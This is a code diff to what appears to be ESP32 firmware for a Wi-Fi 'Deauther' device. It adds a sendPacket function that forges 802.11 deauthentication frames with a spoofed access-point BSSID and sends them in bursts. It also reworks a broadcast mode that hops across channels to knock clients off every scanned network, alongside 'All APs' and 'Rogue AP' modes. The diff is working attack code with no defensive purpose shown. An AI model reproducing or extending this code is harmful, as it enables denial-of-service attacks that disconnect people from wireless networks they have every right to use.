@@ -80,28 +80,48 @@ void Deauther::stop() {
     WiFi.mode(WIFI_OFF);
 }
 
+void Deauther::sendPacket(const uint8_t* targetBssid, int channel, const uint8_t* clientMac) {
+    // Switch to the correct channel to send the packet
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    uint8_t deauth_packet[sizeof(deauth_frame_template)];
+    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
+    
+    // Set BSSID (Source Address and BSSID fields)
+    memcpy(&deauth_packet[10], targetBssid, 6);
+    memcpy(&deauth_packet[16], targetBssid, 6);
+
+    // Set Destination Address
+    if (clientMac) {
+        // Target a specific client
+        memcpy(&deauth_packet[4], clientMac, 6);
+    }
+    // If clientMac is null, the broadcast address from the template is used.
+
+    // Send a burst of packets for higher success rate
+    for (int i = 0; i < 5; i++) {
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        delay(2); // Small delay between packets
+    }
+}
+
 void Deauther::loop() {
     if (!isActive_) return;
 
-    // --- NEW: Handle initial scan for "All APs" attack ---
     if (currentConfig_.target == DeauthTarget::ALL_APS && allTargets_.empty()) {
         if (WiFi.scanComplete() > 0) {
             allTargets_ = app_->getWifiManager().getScannedNetworks();
             if (allTargets_.empty()) {
-                // If scan finished but no networks found, stop the attack.
                 app_->showPopUp("Error", "No networks found.", nullptr, "OK", "", true);
                 app_->returnToMenu(MenuType::DEAUTH_TOOLS_GRID);
                 return;
             }
-            // Scan is complete, start the first hop.
             currentTargetIndex_ = -1;
             hopToNextTarget();
         }
-        // If scan is not complete, we just wait. The "Starting..." screen will show.
         return;
     }
 
-    // --- Main attack logic ---
     if (currentConfig_.target == DeauthTarget::ALL_APS && currentConfig_.mode == DeauthMode::ROGUE_AP) {
         if (millis() - lastHopTime_ > ALL_APS_HOP_INTERVAL_MS) {
             hopToNextTarget();
@@ -110,11 +130,20 @@ void Deauther::loop() {
     
     if (currentConfig_.mode == DeauthMode::BROADCAST) {
         if (millis() - lastPacketSendTime_ > BROADCAST_PACKET_INTERVAL_MS) {
-            sendBroadcastDeauthPacket();
+            if (!allTargets_.empty()) {
+                // Cycle through targets for the broadcast attack
+                currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
+                const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
+                currentTargetSsid_ = currentTarget.ssid;
+                
+                // Use the new modular utility function
+                Deauther::sendPacket(currentTarget.bssid, currentTarget.channel);
+            }
             lastPacketSendTime_ = millis();
         }
     }
 }
+
 
 void Deauther::hopToNextTarget() {
     if (allTargets_.empty()) {
@@ -159,31 +188,6 @@ void Deauther::executeAttackForCurrentTarget() {
         }
         // The channel hopping and packet sending is handled in the broadcast loop.
     }
-}
-
-void Deauther::sendBroadcastDeauthPacket() {
-    if (allTargets_.empty()) return;
-
-    // --- MODIFIED BROADCAST LOGIC ---
-    // Instead of just attacking one target, we cycle through all targets rapidly.
-    
-    // Increment index for next packet
-    currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
-    const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
-    
-    // Hop to the channel of the *next* target. This is the core of the simultaneous attack.
-    esp_wifi_set_channel(currentTarget.channel, WIFI_SECOND_CHAN_NONE);
-    
-    // Update the UI with the target we are currently sending a packet for.
-    currentTargetSsid_ = currentTarget.ssid;
-
-    uint8_t deauth_packet[sizeof(deauth_frame_template)];
-    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
-    
-    memcpy(&deauth_packet[10], currentTarget.bssid, 6); // Source Address
-    memcpy(&deauth_packet[16], currentTarget.bssid, 6); // BSSID
-    
-    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
 }
 
 
